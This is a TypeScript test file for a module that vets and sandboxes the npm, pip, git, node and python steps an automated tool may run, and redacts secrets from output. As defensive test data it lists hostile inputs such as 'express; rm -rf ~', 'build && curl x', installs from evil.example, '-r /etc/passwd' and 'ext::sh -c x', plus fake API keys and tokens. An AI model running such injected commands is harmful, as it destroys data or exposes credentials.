import { checkStep, cleanEnv, commandLine, isSecretFile, redact, relPath, runPlanSchema, tailOutput } from '../shared/runPlan'

const assert = (c: any, m: string) => { console.log(c ? 'PASS' : 'FAIL', m); if (!c) process.exitCode = 1 }

const ok = (program: string, args: string[], extra: Record<string, unknown> = {}) => checkStep({ program, args, ...extra }, { devNull: '/dev/null' })
const refused = (program: string, args: string[], extra: Record<string, unknown> = {}) => { const r = ok(program, args, extra); return r.ok ? null : r.error }
const step = (program: string, args: string[], extra: Record<string, unknown> = {}) => { const r = ok(program, args, extra); if (!r.ok) throw new Error(`${program} ${args.join(' ')}: ${r.error}`); return r.step }

// ---- The programs and what they may do ----
const inst = step('npm', ['install', 'express', '@types/node@22.1.0', 'zod@^3.23.0'])
assert(inst.argv.join(' ') === 'install express @types/node@22.1.0 zod@^3.23.0 --ignore-scripts' && inst.installs && inst.network && !inst.runsCode, 'npm install is allowed, with the packages\' own setup code switched off')
assert(/package setup code off/.test(inst.words) && inst.env.npm_config_ignore_scripts === 'true', 'and says so in plain words')
const withScripts = step('npm', ['install', 'esbuild'], { allowScripts: true })
assert(!withScripts.argv.includes('--ignore-scripts') && withScripts.runsCode && withScripts.setupScripts && /package setup code allowed/.test(withScripts.words), 'setup code is only switched on when the step says so, and it is flagged as running code')
assert(step('npm', ['ci']).argv.join(' ') === 'ci --ignore-scripts', 'npm ci is allowed')
assert(step('npm', ['run', 'build']).runsCode && step('npm', ['test']).argv[0] === 'test', 'npm run and npm test are allowed and flagged as running code')
assert(step('npm', ['run', 'build', '--', '--mode', 'production']).argv.join(' ') === 'run build -- --mode production', 'arguments for a script go after --')
assert(step('npm', ['init', '-y']).kind === 'setup' && step('npm', ['ls', '--depth=0']).kind === 'read' && step('npm', ['--version']).kind === 'read', 'init, ls and the version check are allowed')
assert(step('pnpm', ['add', '-D', 'vitest']).argv.join(' ') === 'add -D vitest --ignore-scripts' && step('yarn', ['install', '--frozen-lockfile']).installs, 'pnpm and yarn can install')

for (const [p, a, why] of [
  ['npm', ['install', '-g', 'typescript'], 'global installs'],
  ['npm', ['exec', 'something'], 'npm exec'],
  ['npm', ['install', 'https://evil.example/x.tgz'], 'a package from a web address'],
  ['npm', ['install', 'github:someone/repo'], 'a package from GitHub by shorthand'],
  ['npm', ['install', 'git+https://github.com/a/b'], 'a package from git'],
  ['npm', ['install', '../other'], 'a package from a folder'],
  ['npm', ['install', 'express', '--registry', 'https://evil.example'], 'a different registry'],
  ['npm', ['install', 'express; rm -rf ~'], 'a command hidden in a package name'],
  ['npm', ['run', 'build && curl x'], 'a command hidden in a script name'],
  ['npm', ['config', 'set', 'x', 'y'], 'npm config'],
  ['npm', ['publish'], 'publishing'],
  ['npm', ['init', 'something'], 'npm init with a package'],
  ['npx', ['create-thing'], 'npx'],
  ['pnpm', ['dlx', 'x'], 'pnpm dlx'],
  ['yarn', ['exec', 'x'], 'yarn exec']
] as Array<[string, string[], string]>) {
  assert(refused(p, a) !== null, `refused: ${p} ${a.join(' ')} (${why})`)
}

// ---- node and python ----
assert(step('node', ['app.js', '--port', '3000']).runsCode && step('node', ['src/server.mjs']).argv[0] === 'src/server.mjs', 'node runs a file from the folder')
for (const a of [['-e', 'process.exit()'], ['--eval', 'x'], ['-p', '1'], ['--require', 'x.js', 'a.js'], ['--import', 'x'], ['app.txt'], ['/etc/passwd.js'], ['../x.js'], ['a.js', '$(whoami)'], ['a.js', '; ls'], ['a.js', 'x\ny'], ['C:/x.js'], ['--inspect', 'a.js']]) {
  assert(refused('node', a) !== null, `refused: node ${a.join(' ').replace('\n', '\\n')}`)
}
assert(step('python3', ['-m', 'venv', '.venv']).kind === 'setup' && step('python', ['app.py', 'x']).runsCode, 'python can make an environment and run a file')
assert(step('python', ['-m', 'pytest', '-q']).runsCode && step('python3', ['-m', 'unittest', 'discover']).runsCode, 'python can run tests')
for (const a of [['-c', 'import os'], ['-m', 'http.server'], ['-m', 'pip', 'download', 'x'], ['-m', 'ensurepip'], ['script.sh'], ['-m', 'venv'], ['-i']]) {
  assert(refused('python', a) !== null, `refused: python ${a.join(' ')}`)
}

// ---- pip must install into an environment in the project ----
assert((refused('pip', ['install', 'requests']) ?? '').includes('environment'), 'pip install without an environment is refused, with the fix')
const pi = step('pip', ['install', 'requests==2.32.0', 'rich[extra]>=13,<14', '-r', 'requirements.txt'], { venv: '.venv' })
assert(pi.env.PIP_ONLY_BINARY === ':all:' && pi.env.PIP_REQUIRE_VIRTUALENV === '1' && pi.venv === '.venv', 'pip install goes into the environment and avoids packages that build code')
assert(!step('pip', ['install', 'x'], { venv: '.venv', allowScripts: true }).env.PIP_ONLY_BINARY, 'unless the step allows it')
assert(step('python3', ['-m', 'pip', 'install', 'flask'], { venv: '.venv' }).argv.join(' ') === '-m pip install flask', 'python -m pip works the same way')
assert(step('pip', ['uninstall', 'requests'], { venv: '.venv' }).argv.join(' ') === 'uninstall -y requests', 'uninstall never waits for a question')
for (const a of [['install', 'git+https://x/y'], ['install', 'https://x.example/p.whl'], ['install', '--index-url', 'https://evil.example', 'x'], ['install', '--target', '/tmp/x', 'y'], ['install', '--user', 'x'], ['install', '/tmp/pkg'], ['install', '-r', '/etc/passwd'], ['install', '-r', '../x.txt'], ['download', 'x'], ['config', 'set', 'a', 'b']]) {
  assert(refused('pip', a, { venv: '.venv' }) !== null, `refused: pip ${a.join(' ')}`)
}
assert(refused('npm', ['install', 'x'], { venv: '.venv' }) !== null, 'an environment folder is only for Python steps')

// ---- git: read, commit and copy, never send ----
assert(step('git', ['status', '-s']).kind === 'read' && step('git', ['log', '--oneline']).argv.includes('-n'), 'git can look at the project, and log is limited')
assert(step('git', ['diff', '--stat', '--', 'src/app.js']).argv.includes('--no-ext-diff'), 'git diff never starts outside programs')
assert(step('git', ['add', '-A']).kind === 'save' && step('git', ['commit', '-m', 'Add the login page']).argv.includes('--no-verify') && step('git', ['commit', '-m', 'x']).env.GIT_CONFIG_KEY_0 === 'core.hooksPath', 'git can save a snapshot, with hooks switched off')
const addAll = step('git', ['add', '-A'])
assert(addAll.argv.slice(0, 4).join(' ') === 'add -A -- .' && addAll.argv.includes(':(exclude,glob,icase)**/.env') && addAll.argv.includes(':(exclude,glob,icase)**/*.pem') && /left out/.test(addAll.words), 'git add everything keeps password and key files out, and says so')
assert(step('git', ['add', 'src']).argv.includes(':(exclude,glob,icase)**/.ssh/**') && step('git', ['add', 'a.txt', 'b.txt']).argv.slice(0, 5).join(' ') === 'add -- a.txt b.txt :(exclude,glob,icase)**/.ssh/**', 'naming a folder or files keeps them out too')
assert(step('git', ['checkout', '-b', 'feature/login']).kind === 'save' && step('git', ['init', '-b', 'main']).kind === 'setup', 'git can start a branch or a repository')
const clone = step('git', ['clone', '--depth', '1', 'https://github.com/richid-stack/Busin.New', 'Busin'])
assert(clone.argv.join(' ') === 'clone --depth 1 -- https://github.com/richid-stack/Busin.New Busin' && clone.network && clone.env.GIT_ALLOW_PROTOCOL === 'https' && /github\.com/.test(clone.words), 'git clone copies a public project over https')
for (const a of [['push'], ['push', 'origin', 'main'], ['pull'], ['fetch'], ['remote', 'add', 'x', 'y'], ['config', 'user.name', 'x'], ['reset', '--hard'], ['clean', '-fd'], ['rebase', 'main'], ['checkout', 'main'], ['checkout', '-b', '--exec=x'], ['commit'], ['commit', '-m', '--amend'],
  ['clone', 'git@github.com:a/b.git'], ['clone', 'http://github.com/a/b'], ['clone', 'https://user:pass@github.com/a/b'], ['clone', 'https://localhost/a/b'], ['clone', 'https://127.0.0.1/a/b'], ['clone', 'https://192.168.1.5/a/b'], ['clone', 'https://nas.local/a/b'], ['clone', 'https://github.com/a/b', '../out'], ['clone', 'ext::sh -c x'], ['clone', '--recurse-submodules', 'https://github.com/a/b'],
  ['add', '.env'], ['add', 'config/.env.production'], ['add', 'keys/server.pem'], ['diff', '--', '.env'], ['add'], ['log', '--format=%H'], ['status', '--ignore-submodules=x']]) {
  assert(refused('git', a as string[]) !== null, `refused: git ${(a as string[]).join(' ')}`)
}

// ---- the folder ----
assert(step('npm', ['ci'], { folder: 'web/app' }).cwd === 'web/app' && step('npm', ['ci']).cwd === '', 'a step can work in a sub-folder of the chosen folder')
for (const f of ['..', '../x', 'a/../../x', '/etc', '/', '-rf', 'C:/Users', 'a;b', 'a\\b']) {
  assert(refused('npm', ['ci'], { folder: f }) !== null, `refused folder "${f}"`)
}
assert(relPath('./src//app.js') === 'src/app.js' && relPath('My Project/app.js') === 'My Project/app.js', 'paths with spaces are fine, and tidied')

// ---- general shape ----
assert(refused('bash', ['-c', 'ls']) !== null && refused('sh', []) !== null && refused('powershell', []) !== null && refused('curl', ['x']) !== null && refused('rm', ['-rf', '.']) !== null && refused('sudo', ['ls']) !== null, 'no shell, no curl, no rm, no sudo')
assert(refused('npm', Array.from({ length: 21 }, () => 'x')) !== null && refused('npm', ['install', 'a'.repeat(300)]) !== null, 'too many or too long arguments are refused')
assert(!checkStep({ program: 'npm', args: ['ci'], extra: 1 }).ok, 'unknown fields are refused')
assert(refused('node', ['a.js', 'x\u0000y']) !== null, 'control characters are refused')

// ---- plans ----
const plan = runPlanSchema.safeParse({ why: 'Install and test the project', steps: [{ program: 'npm', args: ['ci'] }, { program: 'npm', args: ['test'] }] })
assert(plan.success && plan.data.steps.length === 2, 'a plan of allowed steps is accepted')
const badPlan = runPlanSchema.safeParse({ why: 'Do things', steps: [{ program: 'npm', args: ['ci'] }, { program: 'git', args: ['push'] }] })
assert(!badPlan.success && /Step 2/.test(badPlan.error.issues[0]!.message) && /push/.test(badPlan.error.issues[0]!.message), 'one bad step refuses the plan before anyone is asked, and says which step')
assert(!runPlanSchema.safeParse({ why: 'x', steps: [] }).success && !runPlanSchema.safeParse({ why: 'Many steps here', steps: Array.from({ length: 9 }, () => ({ program: 'npm', args: ['ci'] })) }).success, 'a plan has between 1 and 8 steps')
assert(commandLine({ program: 'git', args: ['commit', '-m', 'Add the login page'] }) === 'git commit -m "Add the login page"', 'a command is shown as a person would type it')

// ---- secrets ----
for (const f of ['.env', 'app/.env', '.env.local', '.env.production', 'id_rsa', 'id_ed25519.pub', 'server.pem', 'api.key', '.npmrc', '.netrc', 'credentials.json', 'secrets.yaml', 'service-account-prod.json', '.ssh/config', 'home/.aws/credentials', 'store.kdbx']) assert(isSecretFile(f), `secret file: ${f}`)
for (const f of ['.env.example', '.env.sample', 'src/app.js', 'README.md', 'package.json', 'environment.ts', 'keyboard.js', 'monkey.pem.md']) assert(!isSecretFile(f), `not a secret file: ${f}`)

const noisy = [
  'Using key sk-proj-abcdefghijklmnop1234567890', 'ghp_abcdefghijklmnopqrstuvwxyz0123456789', 'AKIAABCDEFGHIJKLMNOP', 'Authorization: Bearer abcdefghijklmnop.qrstuvwxyz12345',
  'DATABASE_URL=postgres://admin:hunter2@db.example.com/app', 'API_KEY=abc123xyz', 'password: "correct horse"', 'xoxb-1234567890-abcdefghij',
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop', '-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----'
].join('\n')
const cleaned = redact(noisy)
assert(!/sk-proj-abcdef|ghp_abcdef|AKIAABCDEF|hunter2|abc123xyz|correct horse|xoxb-1234|eyJhbGci|MIIabc|abcdefghijklmnop\.qrstuv/.test(cleaned), 'keys, tokens, passwords and private keys are hidden from output')
assert(redact('Compiled 14 files in 2.3s (3 warnings)') === 'Compiled 14 files in 2.3s (3 warnings)' && redact('added 52 packages, and audited 53 packages in 4s') === 'added 52 packages, and audited 53 packages in 4s', 'ordinary output is left alone')

// ---- output ----
assert(tailOutput('a\nb').text === 'a\nb' && !tailOutput('a\nb').cut, 'short output is kept')
const long = Array.from({ length: 2000 }, (_, i) => `line ${i}`).join('\n')
const t = tailOutput(long, 500)
assert(t.cut && t.text.length <= 500 && t.text.endsWith('line 1999') && t.text.startsWith('line '), 'long output keeps the end, cut at a line')
assert(tailOutput('\u001b[32mgreen\u001b[0m\r\nok').text === 'green\nok', 'colour codes and Windows line endings are cleaned')

// ---- environment ----
const env = cleanEnv({ PATH: '/bin', HOME: '/home/a', GITHUB_TOKEN: 'ghp_x', NPM_TOKEN: 'x', AWS_SECRET_ACCESS_KEY: 'x', OPENAI_API_KEY: 'x', FIREBASE_TOKEN: 'x', HTTPS_PROXY: 'http://proxy:8080' }, { CI: '1' })
assert(env.PATH === '/bin' && env.HOME === '/home/a' && env.HTTPS_PROXY === 'http://proxy:8080' && env.CI === '1' && !('GITHUB_TOKEN' in env) && !('NPM_TOKEN' in env) && !('AWS_SECRET_ACCESS_KEY' in env) && !('OPENAI_API_KEY' in env) && !('FIREBASE_TOKEN' in env), 'a command starts with a clean environment: no tokens or keys')

// ---- time ----
assert(step('npm', ['ci']).timeoutMs === 180_000 && step('npm', ['test']).timeoutMs === 120_000 && clone.timeoutMs === 180_000, 'installs get more time than everything else')
